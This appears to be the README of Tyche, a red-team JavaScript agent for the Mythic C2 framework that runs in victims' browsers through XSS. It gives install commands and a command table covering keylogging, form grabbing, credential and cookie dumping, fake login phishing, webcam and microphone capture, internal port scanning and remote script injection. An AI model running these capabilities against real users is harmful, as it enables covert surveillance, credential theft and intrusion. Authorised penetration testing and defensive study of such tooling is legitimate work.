<p align="center">
  <img src="documentation-payload/tyche/tyche.svg" width="280" alt="Tyche" />
</p>

Tyche is a browser-based JavaScript agent designed for XSS contexts. It communicates over MQTT WebSockets, supports Mythic encryption, and can dynamically load commands.

**[Changelog](CHANGELOG.md)** — See what's new, fixed, and changed.

## Installation

To install Tyche, you'll need Mythic installed on a remote computer.

From the Mythic install directory, use the following command to install Tyche as the **root** user:

```
./mythic-cli install github https://github.com/grampae/tyche.git
```

From the Mythic install directory, use the following command to install Tyche as a **non-root** user:

```
sudo -E ./mythic-cli install github https://github.com/grampae/tyche.git
```

Once installed, restart Mythic to build a new agent.

## Notable Features

- Browser-native execution in the active page context
- Designed for XSS operations and user interaction in the browser
- Mythic encryption (AES-256-CBC + HMAC-SHA256, RSA-4096-OAEP key exchange)
- Dynamic command loading at runtime via `load_command`
- Build-time obfuscation presets with optional terser minification
- MQTT WebSocket C2 communications
- Cross-tab leader election — only one tab runs the agent
- State persistence across page reloads via localStorage
- Background task registry with early cancellation support
- CSP-aware external resource loading
- Active task tracking visible in Mythic via `jobs`
- Artifact, keylog, credential, and file tracking in Mythic

## Commands Manual Quick Reference

Command | Syntax | Description
------- | ------ | -----------
clipboard | `clipboard` | Read the victim's clipboard contents.
dom_extract | `dom_extract` | Scrape the page DOM for forms, hidden inputs, emails, meta tags, comments, scripts, and iframes.
drive_download | `drive_download https://example.com/file.exe` | Trigger a file download in the victim's browser from a URL.
eval_js | `eval_js alert('hello')` | Execute JavaScript in the browser context via `eval()`.
exit | `exit` | Task agent to exit.
fakemalware | `fakemalware` | Display aggressive fake popups and visual noise for demo/testing.
fingerprint | `fingerprint` | Collect a detailed browser fingerprint including hardware devices, GPU, math/canvas/audio fingerprints, vendor detection, and more.
form_grabber | `form_grabber {"duration":120}` | Intercept form submissions for a specified duration.
geolocation | `geolocation` | Get the victim's physical location via the Geolocation API.
hook_ajax | `hook_ajax {"duration":60}` | Intercept XHR, fetch, WebSocket, postMessage, and Navigation API traffic.
iframe | `iframe https://example.com/login` | Display a full-page overlay iframe.
inject_script | `inject_script https://example.com/payload.js` | Load and execute an external JavaScript file (CSP-aware).
jobs | `jobs` | List all active tasks or kill background tasks by ID.
keylogger | `keylogger {"duration":60}` | Capture keystrokes (auto-stored in Mythic Keylogs).
load_command | `load_command {"code":"COMMANDS['x']=..."}` | Dynamically load a new command into the running agent.
media_record | `media_record {"duration":10,"type":"audio"}` | Record audio and/or video from the victim browser.
notifications | `notifications {"title":"System Alert"}` | Send browser notifications (waits for user click, 30s timeout).
phish | `phish {"title":"Session Expired"}` | Inject a fake login modal with optional tab-nabbing trigger. Credentials auto-stored in Mythic.
portscan | `portscan {"targets":"192.168.1.0/24","ports":"22,80,443"}` | Perform a browser-based port scan.
proxy | `proxy http://internal:8080/api/users` | Make HTTP requests from the victim's browser with their session/cookies.
screenshot | `screenshot` | Capture a screenshot of the current page (CSP-aware).
storage | `storage` | Dump browser storage, OPFS, Cache API, and saved credentials. Tokens/cookies auto-stored in Mythic Credentials.
sw_persist | `sw_persist {"action":"install","url":"/sw.js"}` | Install a service worker for persistence (requires same-origin URL).
webcam_snap | `webcam_snap` | Capture a single webcam frame.

## Supported C2 Profiles

### mqtt

Tyche uses the Mythic `mqtt` profile and communicates over MQTT WebSockets. All profile configuration is set in Mythic and injected at build time.
